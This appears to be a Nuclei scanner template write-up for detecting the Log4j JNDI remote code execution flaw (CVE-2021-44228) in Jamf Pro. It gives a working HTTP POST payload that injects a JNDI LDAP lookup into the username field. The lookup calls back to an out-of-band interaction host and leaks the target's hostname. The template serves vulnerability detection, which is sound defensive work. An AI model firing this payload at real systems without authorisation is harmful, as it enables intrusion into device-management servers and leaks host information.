# Nuclei Template: JamF Pro - Remote Code Execution (Apache Log4j)
**Template ID:** jamf-pro-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`jamf-pro-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
JamF is susceptible to Lof4j JNDI remote code execution. JamF is the industry standard when it comes to the management of iOS devices (iPhones and iPads), macOS computers (MacBooks, iMacs, etc.), and tvOS devices (Apple TV).

## Steps to reproduce / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}
Content-Type: application/x-www-form-urlencoded

username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/test}&password=
```

## References
- https://github.com/random-robbie/jamf-log4j
- https://docs.jamf.com/technical-articles/Mitigating_the_Apache_Log4j_2_Vulnerability.html
- https://community.connection.com/what-is-jamf/
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
